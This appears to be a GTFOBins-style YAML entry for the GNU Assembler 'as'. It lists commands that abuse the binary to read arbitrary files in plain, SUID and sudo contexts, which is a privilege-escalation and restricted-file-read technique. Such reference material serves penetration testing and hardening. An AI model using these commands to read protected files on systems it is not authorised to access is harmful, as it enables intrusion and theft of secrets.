---
description: The GNU Assembler, commonly known as gas or simply as, its executable name, is the assembler used by the GNU Project.
functions:
  file-read:
    - code: |
        LFILE=file_to_read
        as $LFILE
  suid:
    - code: |
        LFILE=file_to_read
        as $LFILE
  sudo:
    - code: |
        LFILE=file_to_read
        sudo as $LFILE
---
